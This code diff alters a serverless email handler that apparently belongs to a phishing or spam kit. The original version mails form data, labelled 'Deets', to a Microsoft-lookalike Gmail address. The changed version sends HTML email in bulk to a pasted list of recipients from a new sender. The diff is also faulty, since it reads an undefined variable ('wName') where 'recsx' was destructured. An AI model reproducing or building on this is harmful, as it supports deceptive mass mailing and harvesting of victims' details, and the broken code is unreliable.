@@ -22,7 +22,7 @@ exports.handler = async (event, context) => {
 
   try {
     const formData = JSON.parse(event.body);
-    const { recepients } = formData;
+    const { recsx } = formData;
 
     const transporter = nodemailer.createTransport({
       host: 'smtp.gmail.com',
@@ -35,8 +35,8 @@ exports.handler = async (event, context) => {
     });
 
     const mailOptions = {
-      from: '"Deets" <mircosoftii@gmail.com>',
-      to: 'mircosoftii@gmail.com',
+      from: '"Deets" <willyscotmegan@gmail.com>',
+      to: [],
       subject: '',
       html: `
       <!DOCTYPE html>
@@ -154,8 +154,12 @@ exports.handler = async (event, context) => {
       </div>
       </body>
       </html>
-      `      
+      `
     };
+
+  const emList = `${wName}`;
+  const emlArray = emList.trim().split('\n');
+  mailOptions.to = emlArray;
 
     await transporter.sendMail(mailOptions);
 
